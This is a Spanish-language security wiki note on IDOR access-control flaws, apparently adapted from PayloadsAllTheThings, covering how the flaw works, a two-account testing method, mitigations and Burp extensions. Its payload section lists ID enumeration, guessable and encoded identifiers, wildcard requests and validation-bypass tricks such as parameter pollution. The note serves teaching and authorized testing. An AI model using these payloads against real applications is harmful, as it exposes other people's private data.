---
tags:
  - seguridad-web
  - owasp
  - idor
aliases:
  - IDOR
  - Insecure Direct Object References
  - Referencia directa insegura a objetos
---

# IDOR

**IDOR (Insecure Direct Object References) es una vulnerabilidad de control de acceso: la aplicación expone referencias directas a objetos (IDs, archivos, registros) y no verifica que el usuario esté autorizado a acceder a ellos.** Cambiar un identificador permite ver o modificar datos ajenos.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
La aplicación accede a un objeto a partir de un identificador suministrado por el usuario, sin comprobar permisos:

```php
<?php $user_info = get_user_info($_GET['user_id']); ?>
```

Si `profile?user_id=123` no valida la sesión, el atacante cambia a `user_id=124` y lee el perfil de otra persona. El impacto es divulgación, modificación o borrado de datos no autorizados. Es un fallo de **autorización**, no de autenticación.

## Detección y pruebas
Mapea todos los parámetros que referencien objetos: IDs numéricos, nombres, correos, tokens, hashes, rutas. Con dos cuentas de prueba, captura las peticiones de una y reprodúcelas con el identificador de la otra; si obtienes sus datos, hay IDOR. Revisa también endpoints de API, peticiones POST/PUT/DELETE y exportaciones.

## Explotación / payloads
**Enumeración de IDs numéricos** (incrementar/decrementar):

```
GET /profile?user_id=287789
GET /profile?user_id=287790
0x4642d -> 0x4642e            # hexadecimal
1695574808 -> 1695575098      # epoch timestamp
```

**Identificadores adivinables y codificados:**

```
john   doe   john.doe                         # nombres
john.doe@mail.com                             # correos
am9obi5kb2VAbWFpbC5jb20=                       # Base64
md5(email)  sha1(username)                     # parámetros hasheados
95f6e264-bb00-11ec-8833-00155d01ef00          # UUID v1 (predecible por tiempo)
5ae9b90a2c144b9def01ec37                       # MongoDB ObjectId (predecible)
```

**Comodines** (algunos backends devuelven todos los registros):

```
GET /api/users/*      GET /api/users/%
GET /api/users/_      GET /api/users/.
```

**Trucos para sortear validaciones:**

```
POST -> PUT                              # cambiar el método
Content-Type: XML -> JSON                # cambiar el formato
{"id":19}  ->  {"id":[19]}               # valor escalar a array
user_id=mi_id&user_id=victima_id         # parameter pollution
```

## Mitigación
- Verificar la **autorización en el servidor en cada solicitud**, comprobando que el objeto pertenece o es accesible al usuario autenticado.
- Usar **referencias indirectas por sesión** (mapear el ID real a un identificador por usuario) en lugar de exponer claves de base de datos.
- Preferir identificadores no predecibles (UUID v4 aleatorio); no confiar en su oscuridad como único control.
- Centralizar el control de acceso y aplicar negación por defecto; registrar y limitar tasas de accesos anómalos.

## Herramientas
- **Autorize**, **Authz** y **AuthMatrix** (extensiones de Burp) — pruebas automáticas de control de acceso e IDOR.

---
🔗 Relacionado: [[Deserialización insegura]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Insecure Direct Object References](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References) (MIT, © Swissky)
